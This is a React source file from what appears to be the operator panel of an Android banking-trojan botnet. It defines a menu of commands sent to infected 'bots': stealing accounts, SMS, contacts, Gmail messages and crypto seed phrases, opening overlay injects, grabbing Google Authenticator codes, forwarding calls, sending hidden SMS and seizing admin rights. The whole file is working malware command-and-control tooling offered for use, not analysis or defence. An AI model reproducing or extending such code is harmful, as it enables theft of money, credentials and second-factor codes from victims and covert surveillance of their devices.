import {CommandsProps} from "../../Model/Commands";
import {
    AlignCenterOutlined,
    AppstoreAddOutlined,
    ClearOutlined,
    DeleteOutlined,
    GoogleOutlined,
    GooglePlusOutlined,
    IeOutlined,
    KeyOutlined,
    MailOutlined,
    MessageOutlined,
    PhoneOutlined,
    PlayCircleOutlined,
    PoweroffOutlined,
    SelectOutlined,
    SwapOutlined,
    UsergroupAddOutlined,
} from "@ant-design/icons";
import {Menu} from "antd";
import React, {useState} from "react";
import SendSms from "../Modals/SendSMS/SendSMS";
import GetSeedPhrase from "../Modals/GetSeedPhrase/GetSeedPhrase";
import Calling from "../Modals/Calling/Calling";
import ForwardCall from "../Modals/ForwardCall/ForwardCall";
import OpenInject from "../Modals/OpenInject/OpenInject";
import ClearAppData from "../Modals/ClearAppData/ClearAppData";
import RunApp from "../Modals/RunApp/RunApp";
import SendPush from "../Modals/SendPush/SendPush";
import OpenURL from "../Modals/OpenURL/OpenURL";
import DeleteApp from "../Modals/DeleteApp/DeleteApp";
import {Bot} from "../../Model/Bot";
import {getBotsId} from "../../Util/getBotIds";
import sendCommand from "../../Requests/Commands/sendCommands";
import BotComment from "../Modals/BotComment/BotComment";
import GetGmailMessages from "../Modals/GetGmailMessages/GetGmailMessages";

export interface CommandsState extends Record<string, boolean> {
    sendSMS: boolean,
    seedPhrase: boolean,
    calling: boolean,
    forwardCall: boolean,
    openInject: boolean,
    clearCache: boolean,
    runApp: boolean,
    sendPush: boolean,
    openURL: boolean,
    googleAuth: boolean,
    smsList: boolean,
    keylogger: boolean,
    contacts: boolean,
    comment: boolean,
    pushList: boolean,
    deleteApp: boolean,
    hiddenSMS: boolean,
    apps: boolean,
    admin: boolean,
    getAccounts: boolean,
    getGmailMessages: boolean,
}

interface CommandsListProps {
    selectedBots: Bot[],
    type?: string,
}

const CommandsList: React.FC<CommandsListProps> = (props: CommandsListProps) => {
    const [commandsState, setCommandsShow] = useState<CommandsState>({
        comment: false,
        pushList: false,
        sendSMS: false,
        seedPhrase: false,
        calling: false,
        forwardCall: false,
        openInject: false,
        clearCache: false,
        runApp: false,
        sendPush: false,
        openURL: false,
        googleAuth: false,
        smsList: false,
        keylogger: false,
        contacts: false,
        deleteApp: false,
        hiddenSMS: false,
        apps: false,
        admin: false,
        getAccounts: false,
        getGmailMessages: false,
    });

    const setShow = (key: string, value: boolean) => {
        commandsState[key] = value;

        setCommandsShow({
            ...commandsState,
        });
    };

    const commandsList: CommandsProps[] = [
        {
            name: "Get accounts",
            icon: <GooglePlusOutlined/>,
            action: () => {
                sendCommand({
                    command: "getAccounts",
                    payload: [],
                    botIds: getBotsId(props.selectedBots),
                });
            },
        },
        {
            name: "Get installed apps",
            icon: <AppstoreAddOutlined />,
            action: () => {
                sendCommand({
                    command: "getInstallApps",
                    payload: [],
                    botIds: getBotsId(props.selectedBots),
                });
            },
        },
        {
            name: "Send SMS",
            icon: <MailOutlined/>,
            action: () => setShow("sendSMS", true),
        },
        {
            name: "Get seed phrase",
            icon: <AlignCenterOutlined/>,
            action: () => setShow("seedPhrase", true),
        },
        {
            name: "Calling",
            icon: <PhoneOutlined/>,
            action: () => setShow("calling", true),
        },
        {
            name: "Forward call",
            icon: <SwapOutlined/>,
            action: () => setShow("forwardCall", true),
        },
        {
            name: "Open inject",
            icon: <SelectOutlined/>,
            action: () => setShow("openInject", true),
        },
        {
            name: "Update inject list",
            icon: <SelectOutlined/>,
            action: () => {
                sendCommand({
                    command: "updateInjectAndListApps",
                    payload: [],
                    botIds: getBotsId(props.selectedBots),
                });
            },
        },
        {
            name: "Clear app data",
            icon: <ClearOutlined/>,
            action: () => setShow("clearCache", true),
        },
        {
            name: "Run app",
            icon: <PlayCircleOutlined/>,
            action: () => setShow("runApp", true),
        },
        {
            name: "Send push",
            icon: <MessageOutlined/>,
            action: () => setShow("sendPush", true),
        },
        {
            name: "Open URL",
            icon: <IeOutlined/>,
            action: () => setShow("openURL", true),
        },
        {
            name: "Get SMS list",
            icon: <MailOutlined />,
            action: () => {
                sendCommand({
                    command: "getSMS",
                    payload: [],
                    botIds: getBotsId(props.selectedBots),
                });
            },
        },
        {
            name: "Edit comment",
            icon: <MailOutlined />,
            action: () => setShow("comment", true),
        },
        {
            name: "Get contacts list",
            icon: <UsergroupAddOutlined />,
            action: () => {
                sendCommand({
                    command: "getContacts",
                    payload: [],
                    botIds: getBotsId(props.selectedBots),
                });
            },
        },
        {
            name: "Delete app",
            icon: <DeleteOutlined/>,
            action: () => setShow("deleteApp", true),
        },
        {
            name: "Get admin rights",
            icon: <KeyOutlined/>,
            action: () => {
                sendCommand({
                    command: "startAdmin",
                    payload: [],
                    botIds: getBotsId(props.selectedBots),
                });
            },
        },
        {
            name: "Google Auth grabber",
            icon: <GoogleOutlined/>,
            action: () => {
                sendCommand({
                    command: "startAuthenticator2",
                    payload: [],
                    botIds: getBotsId(props.selectedBots),
                });
            },
        },
        {
            name: "Gmail Titles",
            icon: <GoogleOutlined/>,
            action: () => {
                sendCommand({
                    command: "gmailtitles",
                    payload: [],
                    botIds: getBotsId(props.selectedBots),
                });
            },
        },
        {
            name: "Get Gmail Message",
            icon: <GoogleOutlined/>,
            action: () => setShow("getGmailMessages", true),
        },
        {
            name: "Kill bot",
            icon: <PoweroffOutlined/>,
            isDanger: true,
            action: () => setShow("openURL", true),
        },
    ];

    return (
        <>
            <Menu className="commands-menu" theme="dark">
                {commandsList.map((command: CommandsProps, id: number) => {
                    return (
                        <Menu.Item
                            key={id}
                            icon={command.icon}
                            onClick={command.action}
                            danger={command.isDanger}
                            className="menu-item-command"
                            style={{display: command.quickAccess ? "none" : "inherit"}}
                            disabled={props.selectedBots.length > 1 ? command.hideInMultiSelect : false}
                        >
                            {command.name}
                        </Menu.Item>
                    );
                })}
            </Menu>

            <SendSms
                visible={commandsState.sendSMS}
                setVisible={(isVisible: boolean) => setShow("sendSMS", isVisible)}
                selectedBots={props.selectedBots}
            />

            <GetSeedPhrase
                visible={commandsState.seedPhrase}
                setVisible={(isVisible: boolean) => setShow("seedPhrase", isVisible)}
                selectedBots={props.selectedBots}
            />

            <Calling
                visible={commandsState.calling}
                setVisible={(isVisible: boolean) => setShow("calling", isVisible)}
                selectedBots={props.selectedBots}
            />

            <ForwardCall
                visible={commandsState.forwardCall}
                setVisible={(isVisible: boolean) => setShow("forwardCall", isVisible)}
                selectedBots={props.selectedBots}
            />

            <OpenInject
                visible={commandsState.openInject}
                setVisible={(isVisible: boolean) => setShow("openInject", isVisible)}
                selectedBots={props.selectedBots}
            />

            <ClearAppData
                visible={commandsState.clearCache}
                setVisible={(isVisible: boolean) => setShow("clearCache", isVisible)}
                selectedBots={props.selectedBots}
            />

            <RunApp
                visible={commandsState.runApp}
                setVisible={(isVisible: boolean) => setShow("runApp", isVisible)}
                selectedBots={props.selectedBots}
            />

            <SendPush
                visible={commandsState.sendPush}
                setVisible={(isVisible: boolean) => setShow("sendPush", isVisible)}
                selectedBots={props.selectedBots}
            />

            <OpenURL
                visible={commandsState.openURL}
                setVisible={(isVisible: boolean) => setShow("openURL", isVisible)}
                selectedBots={props.selectedBots}
            />

            <DeleteApp
                visible={commandsState.deleteApp}
                setVisible={(isVisible: boolean) => setShow("deleteApp", isVisible)}
                selectedBots={props.selectedBots}
            />

            <BotComment
                selectedBots={props.selectedBots}
                setVisible={(isVisible: boolean) => setShow("comment", isVisible)}
                visible={commandsState.comment}
            />

            <GetGmailMessages
                selectedBots={props.selectedBots}
                setVisible={(isVisible: boolean) => setShow("getGmailMessages", isVisible)}
                visible={commandsState.getGmailMessages}
            />
        </>
    );
};

export default CommandsList;
